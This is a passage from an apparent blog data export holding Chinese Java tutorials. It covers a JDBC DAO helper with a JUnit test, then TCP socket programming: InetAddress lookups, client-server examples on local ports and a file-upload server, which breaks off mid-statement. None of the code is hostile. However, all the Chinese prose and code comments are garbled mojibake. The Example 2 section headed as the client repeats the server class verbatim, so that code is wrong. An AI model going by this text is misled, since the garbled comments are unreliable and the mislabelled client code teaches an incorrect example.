//æŸ¥è¯¢å¤šè¡Œç»“æœçš„é€šç”¨æ–¹æ³•\n    public List<T> queryMulti(String sql,Class<T> clazz,Object... parameters){\n        Connection connection = null;\n        try {\n            connection = JDBCUtilsByDruid.getConnection();\n            return qr.query(connection, sql, new BeanListHandler<T>(clazz), parameters);\n        } catch (SQLException e) {\n            throw new RuntimeException(e);\n        } finally {\n            JDBCUtilsByDruid.close(null, null, connection);\n        }\n    }\n\n    //æŸ¥è¯¢å•è¡Œç»“æœçš„é€šç”¨æ–¹æ³•\n    public T querySingle(String sql, Class<T> clazz, Object... parameters) {\n        Connection connection = null;\n        try {\n            connection = JDBCUtilsByDruid.getConnection();\n            return qr.query(connection, sql, new BeanHandler<T>(clazz), parameters);\n        } catch (SQLException e) {\n            throw new RuntimeException(e); //å°†ç¼–è¯‘å¼‚å¸¸->è¿è¡Œå¼‚å¸¸,æŠ›å‡º\n        } finally {\n            JDBCUtilsByDruid.close(null, null, connection);\n        }\n    }\n\n    //æŸ¥è¯¢å•è¡Œå•åˆ—çš„é€šç”¨æ–¹æ³•\n    public Object queryScalar(String sql, Object... parameters) {\n        Connection connection = null;\n        try {\n            connection = JDBCUtilsByDruid.getConnection();\n            return qr.query(connection, sql, new ScalarHandler<>(), parameters);\n        } catch (SQLException e) {\n            throw new RuntimeException(e);\n        } finally {\n            JDBCUtilsByDruid.close(null, null, connection);\n        }\n    }\n\n}\n```\n\n##### UserDAO.java\n\n```java\npackage com.jwt.dao_.dao;\n\nimport com.jwt.jdbc.datasource.User;\n\npublic class UserDAO extends BasicDAO<User> {\n    //1. æœ‰BasicDAO çš„æ–¹æ³•\n    //2. æ ¹æ®ä¸šåŠ¡éœ€æ±‚ï¼Œå¯ä»¥ç¼–å†™ç‰¹æœ‰çš„æ–¹æ³•.\n\n}\n```\n\n#### com.jwt.dao\\_.test\n\n##### TestDAO.java\n\n```java\npackage com.jwt.dao_.test;\n\nimport com.jwt.dao_.dao.UserDAO;\nimport com.jwt.jdbc.datasource.User;\nimport org.junit.Test;\n\nimport java.util.List;\n\n\npublic class TestDAO {\n\n    ////æµ‹è¯•UserDAO å¯¹user è¡¨crud æ“ä½œ\n    @Test\n    public void testUserDAO(){\n        UserDAO userDAO = new UserDAO();\n        //1.æŸ¥è¯¢å¤šè¡Œè®°å½•\n        List<User> users = userDAO.queryMulti(\"select * from user where id >=?\", User.class, 1);\n        System.out.println(\"===æŸ¥è¯¢ç»“æœ===\");\n        for (User user : users){\n            System.out.println(user);\n        }\n\n        //2.æŸ¥è¯¢å•è¡Œè®°å½•\n        User user = userDAO.querySingle(\"select * from user where id =?\", User.class, 2);\n        System.out.println(\"===æŸ¥è¯¢ç»“æœ===\");\n        System.out.println(user);\n\n        //3.æŸ¥è¯¢å•è¡Œå•åˆ—\n        Object o = userDAO.queryScalar(\"select name from user where id =?\", 3);\n        System.out.println(\"===æŸ¥è¯¢ç»“æœ===\");\n        System.out.println(o);\n\n        //4.dmlæ“ä½œ\n        int update = userDAO.update(\"insert into user values (null,?,?,?)\", \"pyj\", \"135\", \"2000-01-01\");\n        System.out.println(update > 0 ? \"æ‰§è¡ŒæˆåŠŸ\":\"æ‰§è¡Œæ²¡æœ‰å½±å“è¡¨\");\n    }\n\n}\n```\n\n\n\n\n\n<table>\n    <tbody>\n        <tr>\n            <td><input type=\"text\" placeholder=\"ğŸ””è¯·è¾“å…¥æ–‡ç« æŸ¥çœ‹ç ï¼Œçœ‹æ›´å¤šå†…å®¹\"></td>\n            <td><button class=\"btn\">Button</button></td>\n        </tr>\n</tbody></table>\n\n## å‚è€ƒ\n\n- [JDBCæ•™ç¨‹â„¢ (yiibai.com)](https://www.yiibai.com/jdbc)\n\n- [ã€éŸ©é¡ºå¹³è®²JDBCã€‘å¿«é€ŸæŒæ¡JDBC](https://www.bilibili.com/video/BV1zv41157NC)\n\n##  Sponsor\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ°å·§è´¢åŠ›é›„åšï¼Œåˆæ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["JDBC","æ•°æ®åº“"],"categories":["JavaSE"]},{"title":"Java-ç½‘ç»œç¼–ç¨‹","url":"/posts/43348.html","content":"\n##  å‰è¨€\n\nå“ˆå–½ï¼å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å°ç®€ã€‚ä»Šå¤©å¼€å§‹å­¦ä¹ ã€ŠJava-ç½‘ç»œç¼–ç¨‹ã€‹ï¼Œæ­¤ç³»åˆ—æ˜¯æˆ‘åšçš„ä¸€ä¸ª â€œJava ä» 0 åˆ° 1 â€ å®éªŒï¼Œç»™è‡ªå·±ä¸€å¹´å·¦å³æ—¶é—´ï¼ŒæŒ‰ç…§æˆ‘è‡ªå·±æ€»ç»“çš„ [Java-å­¦ä¹ è·¯çº¿](https://jwt1399.top/posts/29829.html)ï¼Œä» 0 å¼€å§‹å­¦ Java çŸ¥è¯†ï¼Œå¹¶ä¸å®šæœŸæ›´æ–°æ‰€å­¦ç¬”è®°ï¼ŒæœŸå¾…ä¸€å¹´åçš„èœ•å˜å§ï¼<æœ‰åŒæ ·æƒ³æ³•çš„å°ä¼™ä¼´ï¼Œå¯ä»¥è”ç³»æˆ‘ä¸€èµ·äº¤æµå­¦ä¹ å“¦ï¼>\n\n- [x] ğŸš©æ—¶é—´å®‰æ’ï¼šé¢„è®¡5å¤©æ›´æ–°å®Œ\n- [x] ğŸ¯å¼€å§‹æ—¶é—´ï¼š03-04\n- [x] ğŸ‰ç»“æŸæ—¶é—´ï¼š03-06\n- [x] ğŸ€æ€»ç»“ï¼šç”¨æ—¶ 3 å¤©ï¼Œæå‰ä¸¤å¤©å®Œæˆä»»åŠ¡ï¼Œç»§ç»­ä¸‹ä¸€ä¸ª ğŸš©\n\n##  ç½‘ç»œåŸºç¡€\n\n### ç®€ä»‹\n\n- ç½‘ç»œï¼šä¸¤å°æˆ–å¤šå°è®¾å¤‡é€šè¿‡ä¸€å®šç‰©ç†è®¾å¤‡è¿æ¥èµ·æ¥æ„æˆäº†ç½‘ç»œ\n- ç½‘ç»œé€šä¿¡ï¼šå°†æ•°æ®é€šè¿‡ç½‘ç»œä»ä¸€å°è®¾å¤‡ä¼ è¾“åˆ°å¦ä¸€å°è®¾å¤‡\n\n- TCPåè®®: ä¼ è¾“æ§åˆ¶åè®®\n  - 1.ä½¿ç”¨TCPåè®®å‰ï¼Œé¡»å…ˆå»ºç«‹TCPè¿æ¥ï¼Œå½¢æˆä¼ è¾“æ•°æ®é€šé“\n  - 2.ä¼ è¾“å‰ï¼Œé‡‡ç”¨\"ä¸‰æ¬¡æ¡æ‰‹\"æ–¹å¼ï¼Œæ˜¯**å¯é çš„**\n  - 3.TCPåè®®è¿›è¡Œé€šä¿¡çš„ä¸¤ä¸ªåº”ç”¨è¿›ç¨‹:å®¢æˆ·ç«¯ã€æœåŠ¡ç«¯\n  - 4.åœ¨è¿æ¥ä¸­å¯è¿›è¡Œå¤§æ•°æ®é‡çš„ä¼ è¾“\n  - 5.ä¼ è¾“å®Œæ¯•ï¼Œéœ€é‡Šæ”¾å·²å»ºç«‹çš„è¿æ¥ï¼Œ**æ•ˆç‡ä½**\n- UDPåè®®: ç”¨æˆ·æ•°æ®åè®®\n  - 1.å°†æ•°æ®ã€æºã€ç›®çš„å°è£…æˆæ•°æ®åŒ…ï¼Œä¸éœ€è¦å»ºç«‹è¿æ¥\n  - 2.å› æ— éœ€è¿æ¥ï¼Œæ•…æ˜¯**ä¸å¯é çš„**\n  - 2.æ¯ä¸ªæ•°æ®æŠ¥çš„å¤§å°é™åˆ¶åœ¨64Kå†…ï¼Œä¸é€‚åˆä¼ è¾“å¤§é‡æ•°æ®\n  - 4.å‘é€æ•°æ®ç»“æŸæ—¶æ— éœ€é‡Šæ”¾èµ„æº(å› ä¸ºä¸æ˜¯é¢å‘è¿æ¥çš„)ï¼Œ**é€Ÿåº¦å¿«**\n\n### Javaæä¾›çš„ç½‘ç»œåŠŸèƒ½ç±»\n\n- **InetAddress**ï¼š ç”¨äºæ ‡è¯†ç½‘ç»œä¸Šçš„ç¡¬ä»¶èµ„æº\n- **Socketå’ŒServerSocket**ï¼š ä½¿ç”¨TCPåè®®å®ç°ç½‘ç»œé€šä¿¡çš„ Socket ç›¸å…³çš„ç±»\n- **Datagram**ï¼š ä½¿ç”¨UDPåè®®ï¼Œå°†æ•°æ®ä¿å­˜åœ¨æ•°æ®æŠ¥ä¸­ï¼Œé€šè¿‡ç½‘ç»œè¿›è¡Œé€šä¿¡\n\n## InetAddress\n\n- getLocalHost() è·å–æœ¬æœº InetAddress å¯¹è±¡\n- getByName() æ ¹æ®æŒ‡å®šä¸»æœºå/åŸŸåè·å– ip åœ°å€å¯¹è±¡\n- getHostName() è·å– InetAddress å¯¹è±¡çš„ä¸»æœºå\n- getHostAddress() è·å– InetAddress å¯¹è±¡çš„åœ°å€\n\n```java\npackage com.jwt.network;\n\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class InetAddress_ {\n    public static void main(String[] args) throws UnknownHostException {\n        //è·å–æœ¬æœºInetAddress å¯¹è±¡\n        InetAddress localHost = InetAddress.getLocalHost();\n        System.out.println(localHost);\n        //æ ¹æ®æŒ‡å®šä¸»æœºå/åŸŸåè·å–å¯¹è±¡\n        InetAddress host2 = InetAddress.getByName(\"jianjian\");\n        System.out.println(host2);\n        InetAddress host3 = InetAddress.getByName(\"www.baidu.com\");\n        System.out.println(host3);\n        //è·å–InetAddresså¯¹è±¡çš„ä¸»æœºå\n        String host3Name = host3.getHostName();\n        System.out.println(host3Name);\n        //è·å–InetAddresså¯¹è±¡çš„åœ°å€\n        String host3Address = host3.getHostAddress();\n        System.out.println(host3Address);\n    }\n}\n\n/**\njianjian/192.168.50.204\njianjian/192.168.50.204\nwww.baidu.com/14.215.177.39\nwww.baidu.com\n14.215.177.39\n**/\n```\n\n## Socket\n\n### ç®€ä»‹\n\n1. å¥—æ¥å­—(Socket)å¼€å‘ç½‘ç»œåº”ç”¨ç¨‹åºè¢«å¹¿æ³›é‡‡ç”¨ï¼Œä»¥è‡³äºæˆä¸ºäº‹å®ä¸Šçš„æ ‡å‡†ã€‚\n2. é€šä¿¡çš„ä¸¤ç«¯éƒ½è¦æœ‰Socketï¼Œæ˜¯ä¸¤å°æœºå™¨é—´é€šä¿¡çš„ç«¯ç‚¹ã€‚\n3. ç½‘ç»œé€šä¿¡å…¶å®å°±æ˜¯ Socket é—´çš„é€šä¿¡ã€‚\n4. Socket å…è®¸ç¨‹åºæŠŠç½‘ç»œè¿æ¥å½“æˆä¸€ä¸ªæµï¼Œæ•°æ®åœ¨ä¸¤ä¸ª Socket é—´é€šè¿‡ IO ä¼ è¾“ã€‚\n5. ä¸€èˆ¬ä¸»åŠ¨å‘èµ·é€šä¿¡çš„åº”ç”¨ç¨‹åºå±å®¢æˆ·ç«¯ï¼Œç­‰å¾…é€šä¿¡è¯·æ±‚çš„ä¸ºæœåŠ¡ç«¯ã€‚\n\n## TCPç¼–ç¨‹\n\n### ç®€ä»‹\n\n- 1.åŸºäºå®¢æˆ·ç«¯-æœåŠ¡ç«¯çš„ç½‘ç»œé€šä¿¡\n- 2.åº•å±‚ä½¿ç”¨çš„æ˜¯TCP/IPåè®®\n- 3.åº”ç”¨åœºæ™¯ä¸¾ä¾‹:å®¢æˆ·ç«¯å‘é€æ•°æ®ï¼ŒæœåŠ¡ç«¯æ¥å—å¹¶æ˜¾ç¤ºæ§åˆ¶å°\n\n| ![](https://img.jwt1399.top/img/image-20220305162250044.png) | ![](https://img.jwt1399.top/img/37360672.jpg) |\n| ------------------------------------------------------------ | --------------------------------------------- |\n\n\n### æµç¨‹\n\nTCPï¼Œä¼ è¾“å‰å…ˆå¼€æœåŠ¡ç«¯ï¼Œacceptï¼Œç­‰å®¢æˆ·ç«¯æ¥å…¥ï¼Œç„¶åè·å¾—å®¢æˆ·ç«¯ socket ç„¶åè¿›è¡Œ IO æ“ä½œ\n\n#### æœåŠ¡ç«¯ç¼–å†™\n\n- **Step 1**ï¼šåˆ›å»ºServerSocketå¯¹è±¡ï¼Œç»‘å®šç›‘å¬çš„ç«¯å£\n  -  ServerSocket serverSocket = new ServerSocket(Port);\n- **Step 2**ï¼šè°ƒç”¨accept()æ–¹æ³•ç›‘å¬å®¢æˆ·ç«¯çš„è¯·æ±‚\n  - Socket socket = serverSocket.accept();\n- **step 3**ï¼šè¿æ¥å»ºç«‹åï¼Œé€šè¿‡è¾“å…¥æµè¯»å–å®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚ä¿¡æ¯\n  - InputStream inputStream = socket.getInputStream();\n- **Step 4**ï¼šé€šè¿‡è¾“å‡ºæµå‘å®¢æˆ·ç«¯å‘é€å“åº”ä¿¡æ¯\n  - OutputStream outputStream = socket.getOutputStream();\n- **Step 5**ï¼šå…³é—­ç›¸å…³èµ„æº\n  - outputStream.close();\n  - inputStream.close();\n  - socket.close();\n  - serverSocket.close();\n\n#### å®¢æˆ·ç«¯ç¼–å†™\n\n- **Step 1**ï¼šåˆ›å»ºSocketå¯¹è±¡ï¼ŒæŒ‡æ˜éœ€è¦é“¾æ¥çš„æœåŠ¡å™¨çš„åœ°å€å’Œç«¯å·\n  - Socket socket = new Socket(\"server address\", port);\n\n- **Step 2**ï¼šé“¾æ¥å»ºç«‹åï¼Œé€šè¿‡è¾“å‡ºæµå‘æœåŠ¡å™¨å‘é€è¯·æ±‚ä¿¡æ¯\n  -  OutputStream outputStream = socket.getOutputStream();\n\n- **Step 3**ï¼šé€šè¿‡è¾“å…¥æµè·å–æœåŠ¡å™¨å“åº”çš„ä¿¡æ¯\n  - InputStream inputStream = socket.getInputStream();\n\n- **Step 4**ï¼šå…³é—­ç›¸å…³èµ„æº\n  - inputStream.close();\n  - outputStream.close();\n  - socket.close();\n\n\n### ä¾‹å­1:ä½¿ç”¨å­—èŠ‚æµé€šä¿¡\n\n- 1.ç¼–å†™ä¸€ä¸ªæœåŠ¡å™¨ç«¯å’Œä¸€ä¸ªå®¢æˆ·ç«¯\n- 2.æœåŠ¡å™¨ç«¯ç›‘å¬ 9999 ç«¯å£\n- 3.å®¢æˆ·ç«¯è¿æ¥åˆ°æœåŠ¡å™¨ç«¯ï¼Œ å‘é€\"ä½ å¥½ï¼ŒæœåŠ¡ç«¯ï¼\"ï¼Œå¹¶æ¥æ”¶æœåŠ¡å™¨ç«¯å›å‘çš„\"ä½ å¥½ï¼Œå®¢æˆ·ç«¯ï¼\"ï¼Œå†é€€å‡º\n- 4.æœåŠ¡å™¨ç«¯æ¥æ”¶åˆ°å®¢æˆ·ç«¯å‘é€çš„ä¿¡æ¯ï¼Œè¾“å‡ºï¼Œå¹¶å‘é€\"ä½ å¥½ï¼Œå®¢æˆ·ç«¯ï¼\", å†é€€å‡º\n\n#### **æœåŠ¡ç«¯**\n\n```java\npackage com.jwt.socket;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class SocketTCP01Server {\n    public static void main(String[] args) throws IOException {\n         //1. ç›‘å¬æœ¬æœºçš„9999 ç«¯å£, ç­‰å¾…è¿æ¥\n        // ç»†èŠ‚: è¦æ±‚åœ¨æœ¬æœºæ²¡æœ‰å…¶å®ƒæœåŠ¡åœ¨ç›‘å¬9999\n        // ç»†èŠ‚ï¼šè¿™ä¸ªServerSocket å¯ä»¥é€šè¿‡accept() è¿”å›å¤šä¸ªSocket[å¤šä¸ªå®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨çš„å¹¶å‘]\n        ServerSocket serverSocket = new ServerSocket(9999);\n        System.out.println(\"æˆ‘æ˜¯æœåŠ¡ç«¯ï¼Œæ­£åœ¨ç›‘å¬9999ç«¯å£ï¼Œç­‰å¾…è¿æ¥...\");\n        //2. å½“æ²¡æœ‰å®¢æˆ·ç«¯è¿æ¥9999 ç«¯å£æ—¶ï¼Œç¨‹åºä¼šé˜»å¡, ç­‰å¾…è¿æ¥\n        // å¦‚æœæœ‰å®¢æˆ·ç«¯è¿æ¥ï¼Œåˆ™ä¼šè¿”å›Socket å¯¹è±¡ï¼Œç¨‹åºç»§ç»­\n        Socket socket = serverSocket.accept();\n        System.out.println(\"æœåŠ¡ç«¯socket=\" + socket.getClass());\n        //3. é€šè¿‡è¾“å…¥æµï¼Œè¯»å–å®¢æˆ·ç«¯å†™å…¥åˆ°æ•°æ®é€šé“çš„æ•°æ®, æ˜¾ç¤º\n        InputStream inputStream = socket.getInputStream();\n        //4. IO è¯»å–\n        byte[] buf = new byte[1024];\n        int readLen = 0;\n        while ((readLen=inputStream.read(buf))!= -1) {\n            System.out.println(new String(buf,0,readLen));\n        }\n        //5. é€šè¿‡è¾“å‡ºæµï¼Œå†™å…¥æ•°æ®åˆ°æ•°æ®é€šé“\n        OutputStream outputStream = socket.getOutputStream();\n        outputStream.write(\"æœåŠ¡ç«¯è¯´ï¼šä½ å¥½ï¼Œå®¢æˆ·ç«¯ï¼\".getBytes());\n        // è®¾ç½®ç»“æŸæ ‡è®°\n        socket.shutdownOutput();\n        //6.å…³é—­æµå’Œsocket\n        outputStream.close();\n        inputStream.close();\n        socket.close();\n        serverSocket.close();\n        System.out.println(\"æœåŠ¡ç«¯é€€å‡º.....\");\n    }\n}\n```\n\n#### **å®¢æˆ·ç«¯**\n\n```java\npackage com.jwt.socket;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.Socket;\n\npublic class SocketTCP01Client {\n    public static void main(String[] args) throws IOException {\n        //1. è¿æ¥æœåŠ¡ç«¯(ip , ç«¯å£ï¼‰å¦‚æœè¿æ¥æˆåŠŸï¼Œè¿”å›Socket å¯¹è±¡\n        Socket socket = new Socket(InetAddress.getLocalHost(), 9999);\n        System.out.println(\"å®¢æˆ·ç«¯socketè¿”å›=\" + socket.getClass());\n        //2. è¿æ¥ä¸Šåï¼Œç”ŸæˆSocket, é€šè¿‡socket.getOutputStream()\n        OutputStream outputStream = socket.getOutputStream();\n        //3. é€šè¿‡è¾“å‡ºæµï¼Œå†™å…¥æ•°æ®åˆ°æ•°æ®é€šé“\n        outputStream.write(\"å®¢æˆ·ç«¯è¯´ï¼šä½ å¥½ï¼ŒæœåŠ¡ç«¯!\".getBytes());\n        // è®¾ç½®ç»“æŸæ ‡è®°\n        socket.shutdownOutput();\n        //4. è·å–å’Œsocket å…³è”çš„è¾“å…¥æµ. è¯»å–æ•°æ®(å­—èŠ‚)ï¼Œå¹¶æ˜¾ç¤º\n        InputStream inputStream = socket.getInputStream();\n        byte[] buf = new byte[1024];\n        int readLen = 0;\n        while ((readLen=inputStream.read(buf))!= -1) {\n            System.out.println(new String(buf,0,readLen));\n        }\n\n        //5. å…³é—­æµå¯¹è±¡å’Œsocket, å¿…é¡»å…³é—­\n        inputStream.close();\n        outputStream.close();\n        socket.close();\n        System.out.println(\"å®¢æˆ·ç«¯é€€å‡º.....\");\n    }\n}\n```\n\n### ä¾‹å­2:ä½¿ç”¨å­—ç¬¦æµé€šä¿¡\n\n- 1.ç¼–å†™ä¸€ä¸ªæœåŠ¡ç«¯å’Œä¸€ä¸ªå®¢æˆ·ç«¯\n- 2.æœåŠ¡ç«¯åœ¨9999ç«¯å£ç›‘å¬\n- 3.å®¢æˆ·ç«¯è¿æ¥åˆ°æœåŠ¡ç«¯ï¼Œå‘é€\"ä½ å¥½ï¼ŒæœåŠ¡ç«¯ï¼\"ï¼Œå¹¶æ¥æ”¶æœåŠ¡ç«¯å›å‘çš„\"ä½ å¥½ï¼Œå®¢æˆ·ç«¯ï¼\"ï¼Œå†é€€å‡º\n- 4.æœåŠ¡ç«¯æ¥æ”¶åˆ°å®¢æˆ·ç«¯å‘é€çš„ä¿¡æ¯ï¼Œè¾“å‡ºï¼Œå¹¶å‘é€\"ä½ å¥½ï¼Œå®¢æˆ·ç«¯ï¼\"ï¼Œå†é€€å‡º\n\n#### **æœåŠ¡ç«¯**\n\n```java\npackage com.jwt.socket;\n\nimport java.io.*;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class SocketTCP02Server {\n    public static void main(String[] args) throws IOException {\n         //1. ç›‘å¬æœ¬æœºçš„9999 ç«¯å£, ç­‰å¾…è¿æ¥\n        // ç»†èŠ‚: è¦æ±‚åœ¨æœ¬æœºæ²¡æœ‰å…¶å®ƒæœåŠ¡åœ¨ç›‘å¬9999\n        // ç»†èŠ‚ï¼šè¿™ä¸ªServerSocket å¯ä»¥é€šè¿‡accept() è¿”å›å¤šä¸ªSocket[å¤šä¸ªå®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨çš„å¹¶å‘]\n        ServerSocket serverSocket = new ServerSocket(9999);\n        System.out.println(\"æˆ‘æ˜¯æœåŠ¡ç«¯ï¼Œæ­£åœ¨ç›‘å¬9999ç«¯å£ï¼Œç­‰å¾…è¿æ¥...\");\n        //2. å½“æ²¡æœ‰å®¢æˆ·ç«¯è¿æ¥9999 ç«¯å£æ—¶ï¼Œç¨‹åºä¼šé˜»å¡, ç­‰å¾…è¿æ¥\n        // å¦‚æœæœ‰å®¢æˆ·ç«¯è¿æ¥ï¼Œåˆ™ä¼šè¿”å›Socket å¯¹è±¡ï¼Œç¨‹åºç»§ç»­\n        Socket socket = serverSocket.accept();\n        System.out.println(\"æœåŠ¡ç«¯socket=\" + socket.getClass());\n        //3. é€šè¿‡socket.getInputStream() è¯»å–å®¢æˆ·ç«¯å†™å…¥åˆ°æ•°æ®é€šé“çš„æ•°æ®, æ˜¾ç¤º\n        InputStream inputStream = socket.getInputStream();\n        //4. IO è¯»å–, ä½¿ç”¨å­—ç¬¦æµ, ä½¿ç”¨InputStreamReader å°†inputStream è½¬æˆå­—ç¬¦æµ\n        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));\n        String s = bufferedReader.readLine();\n        System.out.println(s);\n        //5. é€šè¿‡è¾“å‡ºæµï¼Œå†™å…¥æ•°æ®åˆ°æ•°æ®é€šé“\n        OutputStream outputStream = socket.getOutputStream();\n        BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(outputStream));\n        bufferedWriter.write(\"æœåŠ¡ç«¯è¯´ï¼šä½ å¥½ï¼Œå®¢æˆ·ç«¯ï¼\");\n        // è®¾ç½®ç»“æŸæ ‡è®°\n        bufferedWriter.newLine();// æ’å…¥ä¸€ä¸ªæ¢è¡Œç¬¦ï¼Œè¡¨ç¤ºå›å¤å†…å®¹çš„ç»“æŸ\n        bufferedWriter.flush();//æ³¨æ„éœ€è¦æ‰‹åŠ¨çš„flush\n        //6.å…³é—­æµå’Œsocket\n        bufferedWriter.close();\n        bufferedReader.close();\n        socket.close();\n        serverSocket.close();\n        System.out.println(\"æœåŠ¡ç«¯é€€å‡º.....\");\n    }\n}\n```\n\n#### **å®¢æˆ·ç«¯**\n\n```java\npackage com.jwt.socket;\n\nimport java.io.*;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class SocketTCP02Server {\n    public static void main(String[] args) throws IOException {\n         //1. ç›‘å¬æœ¬æœºçš„9999 ç«¯å£, ç­‰å¾…è¿æ¥\n        // ç»†èŠ‚: è¦æ±‚åœ¨æœ¬æœºæ²¡æœ‰å…¶å®ƒæœåŠ¡åœ¨ç›‘å¬9999\n        // ç»†èŠ‚ï¼šè¿™ä¸ªServerSocket å¯ä»¥é€šè¿‡accept() è¿”å›å¤šä¸ªSocket[å¤šä¸ªå®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨çš„å¹¶å‘]\n        ServerSocket serverSocket = new ServerSocket(9999);\n        System.out.println(\"æˆ‘æ˜¯æœåŠ¡ç«¯ï¼Œæ­£åœ¨ç›‘å¬9999ç«¯å£ï¼Œç­‰å¾…è¿æ¥...\");\n        //2. å½“æ²¡æœ‰å®¢æˆ·ç«¯è¿æ¥9999 ç«¯å£æ—¶ï¼Œç¨‹åºä¼šé˜»å¡, ç­‰å¾…è¿æ¥\n        // å¦‚æœæœ‰å®¢æˆ·ç«¯è¿æ¥ï¼Œåˆ™ä¼šè¿”å›Socket å¯¹è±¡ï¼Œç¨‹åºç»§ç»­\n        Socket socket = serverSocket.accept();\n        System.out.println(\"æœåŠ¡ç«¯socket=\" + socket.getClass());\n        //3. é€šè¿‡socket.getInputStream() è¯»å–å®¢æˆ·ç«¯å†™å…¥åˆ°æ•°æ®é€šé“çš„æ•°æ®, æ˜¾ç¤º\n        InputStream inputStream = socket.getInputStream();\n        //4. IO è¯»å–, ä½¿ç”¨å­—ç¬¦æµ, ä½¿ç”¨InputStreamReader å°†inputStream è½¬æˆå­—ç¬¦æµ\n        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));\n        String s = bufferedReader.readLine();\n        System.out.println(s);\n        //5. é€šè¿‡è¾“å‡ºæµï¼Œå†™å…¥æ•°æ®åˆ°æ•°æ®é€šé“\n        OutputStream outputStream = socket.getOutputStream();\n        BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(outputStream));\n        bufferedWriter.write(\"æœåŠ¡ç«¯è¯´ï¼šä½ å¥½ï¼Œå®¢æˆ·ç«¯ï¼\");\n        // è®¾ç½®ç»“æŸæ ‡è®°\n        bufferedWriter.newLine();// æ’å…¥ä¸€ä¸ªæ¢è¡Œç¬¦ï¼Œè¡¨ç¤ºå›å¤å†…å®¹çš„ç»“æŸ\n        bufferedWriter.flush();//æ³¨æ„éœ€è¦æ‰‹åŠ¨çš„flush\n        //6.å…³é—­æµå’Œsocket\n        bufferedWriter.close();\n        bufferedReader.close();\n        socket.close();\n        serverSocket.close();\n        System.out.println(\"æœåŠ¡ç«¯é€€å‡º.....\");\n    }\n}\n```\n\n### ä¾‹å­3:æ–‡ä»¶ä¼ è¾“\n\n- 1.ç¼–å†™ä¸€ä¸ªæœåŠ¡ç«¯å’Œä¸€ä¸ªå®¢æˆ·ç«¯\n- 2.æœåŠ¡å™¨ç«¯åœ¨ 8888 ç«¯å£ç›‘å¬\n- 3.å®¢æˆ·ç«¯è¿æ¥åˆ°æœåŠ¡ç«¯ï¼Œå‘é€ä¸€å¼ å›¾ç‰‡ /Users/jianjian/Downloads/a.jpeg\n- 4.æœåŠ¡å™¨ç«¯æ¥æ”¶åˆ°å®¢æˆ·ç«¯å‘é€çš„å›¾ç‰‡ï¼Œä¿å­˜åˆ° src ä¸‹ï¼Œå‘é€\"æ”¶åˆ°å›¾ç‰‡\"å†é€€å‡º\n- 5.å®¢æˆ·ç«¯æ¥æ”¶åˆ°æœåŠ¡ç«¯å‘é€çš„\"æ”¶åˆ°å›¾ç‰‡\"ï¼Œå†é€€å‡º\n- 6.è¯¥ç¨‹åºè¦æ±‚ä½¿ç”¨ StreamUtils.javaï¼Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨\n\n![](https://img.jwt1399.top/img/image-20220306184056988.png)\n\n#### æœåŠ¡ç«¯\n\n```java\npackage com.jwt.socket;\n\nimport java.io.*;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class TCPFileUploadServer {\n    public static void main(String[] args) throws Exception {\n        //1. æœåŠ¡ç«¯åœ¨æœ¬æœºç›‘å¬8888ç«¯å£\n        ServerSocket serverSocket = new ServerSocket(8888);\n        System.out.println(\"æœåŠ¡ç«¯ç›‘å¬8888ç«¯å£....\");\n        //2. ç­‰å¾…è¿æ¥\n        Socket socket = serverSocket.accept();\n        //3. è¯»å–å®¢æˆ·ç«¯å‘é€çš„æ•°æ®,é€šè¿‡Socket å¾—åˆ°è¾“å…¥æµ\n        System.out.println(\"æœåŠ¡ç«¯å¼€å§‹æ¥æ”¶å›¾ç‰‡\");\n        BufferedInputStream bis = new BufferedInputStream(socket.getInputStream());\n        byte[] bytes = StreamUtils.streamToByteArray(bis);\n        //4. å°†å¾—åˆ°bytes æ•°ç»„ï¼Œå†™å…¥åˆ°æŒ‡å®šçš„è·¯å¾„ï¼Œå°±å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶äº†\n        String destFilePath = \"src//a.jpeg\";\n        BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(destFilePath));\n        bos.write(bytes);\n        bos.flush();\n        System.out.println(\"æœåŠ¡ç«¯æ¥æ”¶å›¾ç‰‡æˆåŠŸ\");\n        //5.å‘å®¢æˆ·ç«¯å›å¤\"æ”¶åˆ°å›¾ç‰‡\"é€šè¿‡socket è·å–åˆ°è¾“å‡ºæµ(å­—ç¬¦)\n        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n        